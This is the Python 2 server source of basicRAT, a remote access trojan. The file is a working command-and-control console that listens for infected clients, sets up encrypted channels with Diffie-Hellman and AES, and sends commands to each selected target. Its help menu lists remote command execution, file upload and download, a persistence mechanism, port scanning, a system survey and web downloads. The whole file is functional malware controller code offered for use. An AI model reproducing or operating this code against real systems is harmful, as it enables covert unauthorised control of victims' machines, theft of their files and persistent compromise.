#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import socket
import struct
import sys
import time
import threading
import base64

from core import common
from core import crypto
from core import filesock


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
clients             - List connected clients
client <id>         - Connect to client'''
COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget',"exit", "clients", "client", "terminate"]


class Server(threading.Thread):
    host = "0.0.0.0"  # Get local machine name
    clients = []
    alive = True
    client_counter = 0

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket()  # Create a socket object
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.host, port))  # Bind to the port
        self.s.listen(5)  # Now wait for client connection.
        print 'Server started!'

    def run(self):
        print 'Waiting for clients...'
        while True:
            # Handle Incoming Connections
            connection, client_address = self.s.accept()
            address, port = client_address
            print("Connection From: %s:%s" % (address, port))
            self.add_client(connection, address)

    def add_client(self, connection, client_address):
        try:
            client = ClientConnection(connection, client_address)
            client_id = self.client_counter
            self.clients.append({"client_id": client_id,
                                 "client": client})
            self.client_counter += 1
        except Exception as e:
            print(e)
        print(self.clients)

    def get_client(self, client_id):
        try:
            return [c["client"] for c in self.clients if c["client_id"] == client_id][0]
        except IndexError:
            print("Could Not Find Client With ID: {}".format(client_id))

    def get_clients(self):
        return [c for c in self.clients if c["client"].alive]

    def send_message(self, client_id, message):
        client = self.get_client(client_id)
        if not client.alive:
            print("Client Not Connected")
            return
        client.send_message(message)

    def upload(self, client_id, files):
        client = self.get_client(client_id)
        if not client.alive:
            print("Client Not Connected")
            return
        client.send_file(files)

    def download(self, client_id, files):
        client = self.get_client(client_id)
        if not client.alive:
            print("Client Not Connected")
            return
        client.receive_file(files)


class ClientConnection(threading.Thread):
    alive = True

    def __init__(self, connection, address):
        super(ClientConnection, self).__init__()
        self.connection = connection
        self.address = address
        self.dh_key = crypto.diffiehellman(self.connection, server=True)
        self.start()

    def send_message(self, message):
        enc_message = crypto.AES_encrypt(base64.b64encode(message), self.dh_key)
        self.connection.send(struct.pack('>I', len(enc_message)) + enc_message)

    def run(self):
        while self.alive:
            # Handle Incoming Information
            try:
                msglen = struct.unpack('>I', self.connection.recv(4))[0]
            except Exception as e:
                print("Terminating connection thread ({})".format(self.address))
                self.alive = False
                continue

            data = self.connection.recv(msglen)
            data = base64.b64decode(crypto.AES_decrypt(data, self.dh_key))

            cmd, _, action = data.partition(' ')
            # Client Connection needs to be told to expect these actions
            if cmd == "download":
                filesock.recvfile(self.connection, action, self.dh_key)

            elif cmd == "rekey":
                self.dh_key = crypto.diffiehellman(self.connection, server=True)
            # Dump any other output
            else:
                print(data)

        print("Client Thread Terminated")

    def send_file(self, files):
        for fname in files.split():
            fname = fname.strip()
            self.send_message("upload %s" % fname)
            filesock.sendfile(self.connection, fname, self.dh_key)

    def receive_file(self, files):
        for fname in files.split():
            fname = fname.strip()
            self.send_message("download %s" % fname)

    def __str__(self):
        return self.address

    def __repr__(self):
        return self.address


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    current_client_id = "None"

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    server = Server(port)
    server.setDaemon(True)
    server.start()

    print 'basicRAT server listening on port {}...'.format(port)
    while True:
        prompt = raw_input('\n[{}] basicRAT> '.format(current_client_id)).rstrip()
        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # ensure command is valid before sending
        if cmd not in COMMANDS:
            print 'Invalid command, type "help" to see a list of commands.'
            continue

        elif cmd in ['quit', 'q', 'exit']:
            sys.exit(0)

        # display help text
        elif cmd == 'help':
            print HELP_TEXT
            continue

        elif cmd == "clients":
            print "ID  |  Client Address"
            print "---------------------"
            for client in server.get_clients():
                print "%s  | %s" % (client["client_id"], client["client"])
            continue

        elif cmd == "client":
            try:
                current_client_id = int(action)
            except Exception as e:
                print("Invalid Client ID")

        # Everything Below Here Requires A Client ID
        if current_client_id == "None":
            print("Please Set A Client ID (clients)")
            continue

        # download a file
        elif cmd == 'download':
            server.download(current_client_id, action
                            )
        elif cmd == 'upload':
            server.upload(current_client_id, action)
        else:
            # send data to client
            try:
                server.send_message(current_client_id, prompt)
            except Exception as e:
                print("Failed To Send Message: %s" % e)

if __name__ == '__main__':
    main()
